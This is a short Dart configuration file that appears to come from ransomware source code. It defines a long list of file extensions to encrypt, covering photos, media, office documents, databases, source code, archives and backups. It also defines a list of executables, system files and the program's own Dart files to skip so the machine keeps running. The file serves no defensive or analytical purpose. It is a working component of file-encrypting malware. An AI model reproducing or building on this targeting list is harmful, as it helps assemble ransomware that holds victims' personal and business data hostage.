class Config {
  Config();

  static final extensionsToEncrypt = [
    'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw', //images
    'mp3', 'mp4', 'm4a', 'aac', 'ogg', 'flac', 'wav', 'wma', 'aiff',
    'ape', //Audios
    'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf',
    '3gp', //Videos
    'doc', 'docx', 'xls', 'xlsx', 'ppt',
    'pptx', //Microsoft office, OpenOffice,Adobe,Latex,Markdown,etc
    'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md', 'yml',
    'yaml', 'json', 'xml', 'csv',
    'db', 'sql', 'dbf', 'mdb', 'iso',
    'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css', // web
    'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx', //Código fonte C e C++
    'java', 'class', 'jar', //Java
    'ps', 'bat', 'vb', //Windows scripts
    'awk', 'sh', 'cgi', 'pl', 'ada', 'swift', // unix scripts
    'go', 'py', 'pyc', 'bf', 'coffee',
    'zip', 'tar', 'tgz', 'bz2', '7z', 'rar',
    'bak',
    'txt'
  ];

  static final extensionsToIgnore = [
    'exe', 'dart', 'mart', 'dll', 'so', 'rpm', 'deb', 'vmlinuz',
    'img' //System Files
  ];
}
